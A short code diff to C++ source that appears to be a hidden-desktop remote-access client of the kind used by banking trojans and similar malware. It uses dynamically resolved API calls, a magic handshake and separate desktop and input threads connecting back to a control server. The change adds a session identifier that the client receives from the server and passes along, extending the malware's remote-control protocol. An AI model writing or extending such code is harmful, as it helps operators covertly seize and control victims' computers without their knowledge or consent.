@@ -413,6 +413,7 @@ static BOOL RecvInt(SOCKET s, int *i)
 
 static DWORD WINAPI DesktopThread(LPVOID param)
 {
+    DWORD sessionId = (DWORD)(ULONG_PTR)param;
     SOCKET s = ConnectServer();
 
     if (!Funcs::pSetThreadDesktop(g_hDesk))
@@ -421,6 +422,8 @@ static DWORD WINAPI DesktopThread(LPVOID param)
     if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
         goto exit;
     if (!SendInt(s, Connection::desktop))
+        goto exit;
+    if (!SendInt(s, (int)sessionId))
         goto exit;
 
     for (;;)
@@ -685,11 +688,11 @@ static DWORD WINAPI InputThread(LPVOID param)
     if (!SendInt(s, Connection::input))
         return 0;
 
-    int response;
-    if (!RecvInt(s, &response))
+    int sessionId;
+    if (!RecvInt(s, &sessionId) || !sessionId)
         return 0;
 
-    g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, NULL, 0, 0);
+    g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, (LPVOID)(ULONG_PTR)(DWORD)sessionId, 0, 0);
 
     POINT      lastPoint;
     BOOL       lmouseDown = FALSE;
